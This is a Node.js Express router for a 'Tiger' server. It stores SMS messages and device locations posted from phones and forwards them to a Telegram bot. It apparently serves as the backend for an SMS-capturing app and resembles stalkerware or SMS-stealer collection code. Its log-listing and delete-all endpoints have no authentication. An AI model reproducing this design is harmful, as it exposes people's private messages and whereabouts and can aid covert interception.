const express = require('express');
const router = express.Router();
const SmsLog = require('../models/SmsLog');
const User = require('../models/User');
const axios = require('axios');

// POST /log-sms -> save SMS to DB and notify user's Telegram if configured
router.post('/log-sms', async (req, res) => {
  try {
    const { sender, message, device, deviceId, timestamp, location, meta } = req.body;

    const newEntry = new SmsLog({
      device: device || 'Tiger-Mobile',
      deviceId: deviceId || 'unknown',
      sender: sender || 'Unknown',
      message: message || 'No Content',
      time: timestamp ? new Date(timestamp) : new Date(),
      location: location || 'Disabled',
      meta: meta || {}
    });

    await newEntry.save();

    // After saving, find user for this deviceId and notify if they have Telegram config
    try {
      const user = await User.findOne({ deviceId: newEntry.deviceId });
      if (user && user.telegramBotToken && user.telegramChatId) {
        const mapUrl = (newEntry.location !== 'Disabled') ? `\n📍 Location: https://www.google.com/maps?q=${newEntry.location}` : '';
        const telegramMsg = `🐯 *Tiger Alert!*\n\n` +
          `📱 *Device:* ${newEntry.device} (${newEntry.deviceId})\n` +
          `👤 *From:* ${newEntry.sender}\n` +
          `💬 *Message:* ${newEntry.message}\n` +
          `⏰ *Time:* ${newEntry.time.toLocaleString()}` + mapUrl;

        await axios.post(`https://api.telegram.org/bot${user.telegramBotToken}/sendMessage`, {
          chat_id: user.telegramChatId,
          text: telegramMsg,
          parse_mode: 'Markdown'
        }, { timeout: 10000 });
      }
    } catch (notifyErr) {
      console.warn('[logs] Telegram notify failed:', notifyErr.message);
    }

    res.status(200).json({ status: 'success', id: newEntry._id });
  } catch (err) {
    console.error('[logs] /log-sms error:', err);
    res.status(500).json({ status: 'error' });
  }
});

// GET /get-logs -> list logs (supports ?deviceId=)
router.get('/get-logs', async (req, res) => {
  try {
    const { deviceId, limit = 200 } = req.query;
    const q = deviceId ? { deviceId } : {};
    const logs = await SmsLog.find(q).sort({ time: -1 }).limit(Number(limit)).lean();
    res.json(logs);
  } catch (err) {
    console.error('[logs] get-logs error:', err);
    res.status(500).json([]);
  }
});

// POST /clear-logs -> clear logs (admin)
router.post('/clear-logs', async (req, res) => {
  try {
    await SmsLog.deleteMany({});
    res.json({ success: true });
  } catch (err) {
    console.error('[logs] clear-logs error:', err);
    res.status(500).json({ success: false });
  }
});

// POST /send-test/:deviceId -> send a test notification to user's Telegram
router.post('/send-test/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const user = await User.findOne({ deviceId });
    if (!user || !user.telegramBotToken || !user.telegramChatId) return res.status(400).json({ error: 'No telegram config for device' });

    const text = '🐯 Test notification from Tiger Server — ' + new Date().toLocaleString();
    await axios.post(`https://api.telegram.org/bot${user.telegramBotToken}/sendMessage`, {
      chat_id: user.telegramChatId,
      text
    });

    res.json({ success: true });
  } catch (err) {
    console.error('[logs] send-test error:', err);
    res.status(500).json({ success: false });
  }
});

module.exports = router;